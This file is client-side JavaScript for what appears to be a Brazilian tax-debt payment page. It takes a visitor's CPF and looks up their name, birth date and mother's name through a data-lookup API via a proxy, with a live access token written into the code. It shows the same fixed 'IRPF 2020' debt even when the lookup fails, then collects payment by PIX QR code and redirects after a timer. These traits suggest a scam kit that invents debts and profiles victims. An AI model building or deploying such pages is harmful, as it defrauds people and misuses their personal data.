// Helper functions to preserve UTM parameters
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    const paramObj = {};
    for (const [key, value] of params) {
        paramObj[key] = value;
    }
    return paramObj;
}

function buildUrlWithParams(baseUrl) {
    const params = getUrlParams();
    if (Object.keys(params).length === 0) {
        return baseUrl;
    }
    const url = new URL(baseUrl, window.location.origin);
    for (const [key, value] of Object.entries(params)) {
        url.searchParams.set(key, value);
    }
    return url.toString();
}

// Save customer data to localStorage if flag is set


document.addEventListener('DOMContentLoaded', function() {
    const video = document.getElementById('newsVideo');
    const soundButton = document.getElementById('soundButton');

    // Only add video event listeners if video and sound button exist
    if (video && soundButton) {
        video.addEventListener('click', function() {
            if (video.paused) {
                video.play();
                if (video.muted) {
                    soundButton.style.display = 'flex';
                }
            } else {
                video.pause();
                soundButton.style.display = 'flex';
            }
        });

        soundButton.addEventListener('click', function() {
            video.currentTime = 0;
            video.muted = false;
            video.play();
            soundButton.style.display = 'none';
        });

        video.addEventListener('ended', function() {
            video.pause();
            video.muted = true;
            soundButton.style.display = 'flex';
        });
    }
});


let currentTransactionId = null;
let paymentMonitorInterval = null;

async function generatePayment() {
    const modal = document.getElementById('paymentModal');
    const loaderContainer = document.getElementById('loaderContainer');
    const qrCodeContainer = document.getElementById('qrCodeContainer');

    try {
        modal.style.display = 'block';
        loaderContainer.style.display = 'block';
        qrCodeContainer.style.display = 'none';

        const response = await fetch('/generate-pix', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });

        const data = await response.json();

        if (data.success && data.pixCode) {
            // Salvar ID da transação para monitoramento
            currentTransactionId = data.transactionId || data.orderId;
            
            // Atualizar número do documento com ID da transação
            const docNumber = document.getElementById('documentNumber');
            if (docNumber && currentTransactionId) {
                docNumber.textContent = currentTransactionId.substring(0, 13).toUpperCase();
            }
            
            // Gerar QR code a partir do código PIX usando uma biblioteca externa
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
            document.getElementById('qrCodeImage').src = qrCodeUrl;
            document.getElementById('pixCode').textContent = data.pixCode;

            loaderContainer.style.display = 'none';
            qrCodeContainer.style.display = 'block';
            startPixCountdown();
            
            // Iniciar monitoramento do pagamento
            startPaymentMonitoring();
        } else {
            throw new Error(data.error || 'Erro ao gerar o pagamento');
        }
    } catch (error) {
        console.error('Erro:', error);
        loaderContainer.style.display = 'none';
        alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
        setTimeout(() => {
            modal.style.display = 'none';
        }, 1500);
    }
}

function startPaymentMonitoring() {
    if (!currentTransactionId) {
        console.log('Nenhuma transação para monitorar');
        return;
    }

    console.log(`Iniciando monitoramento do pagamento: ${currentTransactionId}`);
    
    // Verificar status a cada 3 segundos
    paymentMonitorInterval = setInterval(async () => {
        try {
            console.log(`🔍 Verificando status da transação: ${currentTransactionId}`);
            const response = await fetch(`/check-payment-status/${currentTransactionId}`);
            const statusData = await response.json();
            
            console.log('📊 Resposta completa do status:', statusData);
            console.log(`🎯 Status: ${statusData.status}, Success: ${statusData.success}`);
            
            // Se o pagamento foi confirmado
            if (statusData.success && statusData.status === 'paid') {
                console.log('🎉 PAGAMENTO CONFIRMADO! Iniciando redirecionamento para /aviso...');
                
                // Parar o monitoramento
                clearInterval(paymentMonitorInterval);
                console.log('⏹️ Monitoramento interrompido');
                
                // Fechar modal
                document.getElementById('paymentModal').style.display = 'none';
                console.log('❌ Modal fechado');
                
                // Redirecionar para /aviso
                console.log('🔄 Redirecionando para /aviso...');
                
                // Tentar diferentes métodos de redirecionamento com params preservados
                const avisoUrl = buildUrlWithParams('aviso.html');
                try {
                    // Método 1: window.location.href
                    window.location.href = avisoUrl;
                } catch (e1) {
                    console.error('Erro no método 1:', e1);
                    try {
                        // Método 2: window.location.replace
                        window.location.replace(avisoUrl);
                    } catch (e2) {
                        console.error('Erro no método 2:', e2);
                        try {
                            // Método 3: window.location.assign
                            window.location.assign(avisoUrl);
                        } catch (e3) {
                            console.error('Erro no método 3:', e3);
                            // Método 4: link manual
                            const link = document.createElement('a');
                            link.href = avisoUrl;
                            link.click();
                        }
                    }
                }
            } else {
                console.log(`⏳ Pagamento ainda pendente - Status: ${statusData.status || 'waiting_payment'}`);
            }
        } catch (error) {
            console.error('❌ Erro ao verificar status do pagamento:', error);
        }
    }, 3000); // Verificar a cada 3 segundos
    
    // Timeout de 5 minutos para redirecionamento forçado (backup)
    setTimeout(() => {
        console.log('🕐 Timeout de 5 minutos atingido - verificando se deve redirecionar...');
        
        // Se ainda estiver monitorando, tentar um redirecionamento forçado
        if (paymentMonitorInterval && currentTransactionId) {
            console.log('⚠️ Executando redirecionamento de backup após 5 minutos...');
            
            // Parar o monitoramento
            clearInterval(paymentMonitorInterval);
            
            // Fechar modal
            document.getElementById('paymentModal').style.display = 'none';
            
            // Mostrar alerta e redirecionar
            alert('Verificando seu pagamento...');
            setTimeout(() => {
                window.location.href = buildUrlWithParams('aviso.html');
            }, 1000);
        }
    }, 5 * 60 * 1000); // 5 minutos
    
    // Parar monitoramento após 20 minutos (tempo limite do PIX)
    setTimeout(() => {
        if (paymentMonitorInterval) {
            clearInterval(paymentMonitorInterval);
            console.log('Monitoramento do pagamento encerrado por timeout');
        }
    }, 20 * 60 * 1000);
}

function copyPixCode() {
    const pixCode = document.getElementById('pixCode').textContent;
    const copyButton = document.querySelector('.copy-pix-button');

    navigator.clipboard.writeText(pixCode).then(() => {
        copyButton.classList.add('copy-success');
        copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
        
        // Aguardar 4 segundos antes de fechar o modal e mostrar o de aguardando
        setTimeout(() => {
            // Fechar o modal do PIX
            document.getElementById('paymentModal').style.display = 'none';
            
            // Mostrar o modal de aguardando pagamento
            showWaitingPaymentModal();
            
            // Restaurar o texto original do botão
            copyButton.classList.remove('copy-success');
            copyButton.innerHTML = '<i class="fas fa-copy"></i> COPIAR CÓDIGO PIX PARA PAGAMENTO';
        }, 4000); // 4 segundos
        
    }).catch(err => {
        console.error('Erro ao copiar:', err);
    });
}

function showWaitingPaymentModal() {
    // Mostrar o modal
    document.getElementById('waitingPaymentModal').style.display = 'block';
    
    // Copiar o código PIX para o modal de aguardando
    const pixCode = document.getElementById('pixCode').textContent;
    document.getElementById('waitingPixCode').textContent = pixCode;
    
    // Configurar o botão para alterar texto após 3 segundos
    setTimeout(() => {
        const waitingButton = document.getElementById('waitingCopyButton');
        waitingButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
    }, 3000); // 3 segundos
    
    // Após 40 segundos, mostrar o botão "Realizei o pagamento"
    setTimeout(() => {
        document.getElementById('waitingContainer').style.display = 'none';
        document.getElementById('paymentCompletedContainer').style.display = 'block';
    }, 40000); // 40 segundos
}

function copyWaitingPixCode() {
    const pixCode = document.getElementById('waitingPixCode').textContent;
    const copyButton = document.getElementById('waitingCopyButton');

    navigator.clipboard.writeText(pixCode).then(() => {
        copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
        
        // Após 3 segundos, mudar para "Copiar código PIX"
        setTimeout(() => {
            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
        }, 3000); // 3 segundos
        
    }).catch(err => {
        console.error('Erro ao copiar:', err);
    });
}

function redirectToAviso() {
    // Fechar modal
    document.getElementById('waitingPaymentModal').style.display = 'none';
    
    // Redirecionar para /aviso
    window.location.href = buildUrlWithParams('aviso.html');
}

function startPixCountdown() {
    let minutes = 10;
    let seconds = 0;
    const countdownElement = document.getElementById('pixCountdown');

    const countdown = setInterval(() => {
        if (seconds === 0) {
            if (minutes === 0) {
                clearInterval(countdown);
                return;
            }
            minutes--;
            seconds = 59;
        } else {
            seconds--;
        }

        const minutesStr = minutes.toString().padStart(2, '0');
        const secondsStr = seconds.toString().padStart(2, '0');
        countdownElement.innerHTML = `<i class="fas fa-clock"></i> Prazo de pagamento expira em: ${minutesStr}:${secondsStr}`;
    }, 1000);
}

// Adicionar evento de clique no botão "Regularize agora"
document.addEventListener('DOMContentLoaded', function() {
    const regularizeButton = document.querySelector('.regularize-button');
    if (regularizeButton) {
        regularizeButton.addEventListener('click', function() {
            window.location.href = buildUrlWithParams('chat.html');
        });
    }
    
    // CPF form handling
    const cpfForm = document.getElementById('cpfForm');
    if (cpfForm) {
        const cpfInput = document.getElementById('cpfInput');
        
        // Format CPF as user types
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = value;
        });
        
        // CPF digit verification (standard algorithm)
        function isValidCPF(cpf) {
            if (!cpf || cpf.length !== 11) return false;
            // Reject all same-digit CPFs
            if (/^(\d)\1{10}$/.test(cpf)) return false;

            // Validate first check digit
            let sum = 0;
            for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
            let remainder = (sum * 10) % 11;
            if (remainder === 10) remainder = 0;
            if (remainder !== parseInt(cpf.charAt(9))) return false;

            // Validate second check digit
            sum = 0;
            for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
            remainder = (sum * 10) % 11;
            if (remainder === 10) remainder = 0;
            if (remainder !== parseInt(cpf.charAt(10))) return false;

            return true;
        }

        // Show error on CPF field
        function showCpfError(message) {
            const cpfError = document.getElementById('cpfError');
            const cpfInput = document.getElementById('cpfInput');
            cpfInput.style.borderColor = '#dc3545';
            cpfError.textContent = message;
            cpfError.style.display = 'block';
        }

        // Hide error on CPF field
        function hideCpfError() {
            const cpfError = document.getElementById('cpfError');
            const cpfInput = document.getElementById('cpfInput');
            cpfInput.style.borderColor = '#dee2e6';
            cpfError.style.display = 'none';
        }

        // Função de fallback para usar dados mockados
        function usarFallback(cpfValue, cpfFormatted) {
            const validatedData = {
                cpf: cpfValue,
                nomeCompleto: 'Usuário',
                dataNascimento: '01/01/1990',
                nomeMae: 'Não informado'
            };
            sessionStorage.setItem('cpfValidatedData', JSON.stringify(validatedData));

            localStorage.setItem('customerData', JSON.stringify({
                nome: 'Usuário',
                cpf: cpfFormatted,
                situacao: 'REGULAR',
                data_nascimento: '1990-01-01', // Formato da API (YYYY-MM-DD)
                nome_mae: 'Não informado',
                debitos: [{ tipo: 'IRPF 2020', valor: 101.82, vencimento: '15/12/2024' }]
            }));

            hideCpfError();
            document.getElementById('cpfInput').style.borderColor = '#28a745';
            window.location.href = buildUrlWithParams('adesao.html');
        }

        // Hide error when user starts editing again
        cpfInput.addEventListener('focus', function() {
            hideCpfError();
        });

        // Clear stored CPF data when editing
        cpfInput.addEventListener('input', function() {
            sessionStorage.removeItem('cpfValidatedData');
        });

        // Handle form submission
        cpfForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            hideCpfError();

            const cpfValue = cpfInput.value.replace(/\D/g, '');
            if (cpfValue.length !== 11) {
                showCpfError('CPF inválido. Digite 11 dígitos.');
                return;
            }

            // Step 1: Local math validation
            if (!isValidCPF(cpfValue)) {
                showCpfError('CPF inválido. Verifique os dígitos.');
                return;
            }

            const btn = e.target.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
            document.getElementById('cpfLoading').style.display = 'block';

            try {
                console.log('Tentando consultar CPF na API...');
                
                // Step 2: Call external API usando a documentação com proxy CORS para evitar erro
                const proxyUrl = 'https://api.allorigins.win/get?url=';
                const apiUrl = encodeURIComponent(`https://search.apisegura.cloud/cpf?token=sk_live_dDDrUBdxkA7ANWYp_BZxlWnQw6UNNGPd&cpf=${cpfValue}`);
                
                const response = await fetch(proxyUrl + apiUrl);
                
                // O proxy retorna os dados no campo contents
                const proxyData = await response.json();
                const data = JSON.parse(proxyData.contents);
                console.log('Dados da API via proxy:', data);

                // Verificar se a API retornou dados válidos
                if (data && data.nome) {
                    // Save validated data for downstream use
                    const validatedData = {
                        cpf: cpfValue,
                        nomeCompleto: data.nome,
                        dataNascimento: data.nascimento || '',
                        nomeMae: data.nome_mae || ''
                    };
                    sessionStorage.setItem('cpfValidatedData', JSON.stringify(validatedData));

                    // Save legacy customerData for downstream pages
                    localStorage.setItem('customerData', JSON.stringify({
                        nome: data.nome || 'Usuário',
                        cpf: cpfInput.value,
                        situacao: data.situacao_receita || 'REGULAR',
                        data_nascimento: data.nascimento || '',
                        nome_mae: data.nome_mae || '',
                        debitos: [{ tipo: 'IRPF 2020', valor: 101.82, vencimento: '15/12/2024' }]
                    }));

                    // Clear any visible error and proceed
            hideCpfError();
            cpfInput.style.borderColor = '#28a745';
            window.location.href = buildUrlWithParams('adesao.html');
                } else {
                    // Fallback: se CPF não for encontrado na API, usar dados mockados
                    console.warn('CPF não encontrado na API, usando fallback');
                    usarFallback(cpfValue, cpfInput.value);
                }
            } catch (err) {
                // Fallback: se a API falhar, usar dados mockados para permitir o usuário continuar
                console.warn('API de CPF falhou, usando fallback:', err);
                usarFallback(cpfValue, cpfInput.value);
            } finally {
                btn.disabled = false;
                btn.innerHTML = originalText;
                document.getElementById('cpfLoading').style.display = 'none';
            }
        });
    }
});
// Fechar modal ao clicar fora
window.onclick = function(event) {
    const paymentModal = document.getElementById('paymentModal');
    const waitingModal = document.getElementById('waitingPaymentModal');
    
    if (event.target == paymentModal) {
        paymentModal.style.display = 'none';
    }
    
    if (event.target == waitingModal) {
        waitingModal.style.display = 'none';
    }
}

// Função para confirmar os dados do usuário
function confirmData() {
    // Scroll para baixo para mostrar as informações de débito
    const debtorInfo = document.querySelector('.user-info:nth-of-type(2)');
    if (debtorInfo) {
        debtorInfo.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
}

// Only show loading screen on CPF routes
document.addEventListener('DOMContentLoaded', function() {
    const currentPath = window.location.pathname;
    const isCpfRoute = /^\/\d{11}$/.test(currentPath); // Matches /11digits
    
    if (isCpfRoute) {
        // Show loading screen for 4 seconds
        setTimeout(function() {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('mainContent').classList.add('show');
        }, 4000);
    } else {
        // Hide loading screen immediately for other pages
        document.getElementById('loadingScreen').style.display = 'none';
        document.getElementById('mainContent').classList.add('show');
    }
    
    // Set current date in Brazilian format
    const today = new Date();
    const dateOptions = { 
        day: '2-digit', 
        month: '2-digit', 
        year: 'numeric',
        timeZone: 'America/Sao_Paulo'
    };
    const formattedDate = today.toLocaleDateString('pt-BR', dateOptions);
    const currentDateElement = document.getElementById('currentDate');
    if (currentDateElement) {
        currentDateElement.textContent = formattedDate;
    }
});

document.addEventListener('DOMContentLoaded', function() {
    const menuToggle = document.querySelector('.movebrasil-hamburger');
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    const closeBtn = document.getElementById('sidebarClose');

    function openSidebar() {
        if (sidebar) sidebar.classList.add('open');
        if (overlay) overlay.classList.add('open');
        document.body.style.overflow = 'hidden';
    }

    function closeSidebar() {
        if (sidebar) sidebar.classList.remove('open');
        if (overlay) overlay.classList.remove('open');
        document.body.style.overflow = '';
    }

    if (menuToggle) {
        menuToggle.addEventListener('click', openSidebar);
    }
    if (closeBtn) closeBtn.addEventListener('click', closeSidebar);
    if (overlay) overlay.addEventListener('click', closeSidebar);

    const sidebarItems = document.querySelectorAll('.sidebar-item');
    sidebarItems.forEach(function(item) {
        item.addEventListener('click', function() {
            const panel = item.nextElementSibling;
            if (panel && panel.classList.contains('sidebar-item-panel')) {
                panel.classList.toggle('open');
            }
        });
    });
});
